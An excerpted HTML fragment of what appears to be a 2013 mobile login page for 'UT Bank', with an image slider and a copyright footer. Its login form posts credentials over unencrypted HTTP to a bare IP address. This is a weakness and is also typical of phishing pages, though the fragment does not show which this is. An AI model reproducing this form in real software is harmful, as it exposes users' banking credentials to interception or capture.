        ...
        <div id='page' data-role='page'>
            ...
            <div id='content' data-role='content'>
                <div id='ctnLogon'>
                    ...
                    <!-- LOGIN FORM -->
                    <form id="frmLogon" action="http://216.224.161.207/UTBank/php/validate.php" method="POST">
                        <table>
                            <tr>
                ...
                <div id="wrapper">
					<div class="slider-wrapper theme-default">
						<div id="slider" class="nivoSlider" style="height: auto;">
							<img src="images/UTBank.jpg" data-thumb="images/UTBank.jpg" alt="" style="width: 450px;visibility: hidden; display: inline; max-height: 300px;"/>
							...
							<img src="images/UTBank.jpg" data-thumb="images/UTBank.jpg" alt="" data-transition="slideInLeft" style="width: 450px;visibility: hidden; display: inline; max-height: 300px;"/>
						</div>
					</div>
				</div>
                <!-- END OF IMAGE SLIDER -->
               ...
               <p>
					<div style="background: url('images/lo.PNG');height: 100px;background-size: 50%;background-repeat:no-repeat; width:200px; "></div>
					<div  style='text-align:left; font-family: Arial, Helvetica, sans-serif;font-size: 10px; '>

						&copy; 2013 UT Bank. Copyright 2013 UT Bank.
						<br />
						UT Bank All rights reserved
						UT Bank Group authorized financial services and registered credit provider.
			...
			<div id="lower">
				...
				background-size: 300%; color: white; display: none;color:black; ">
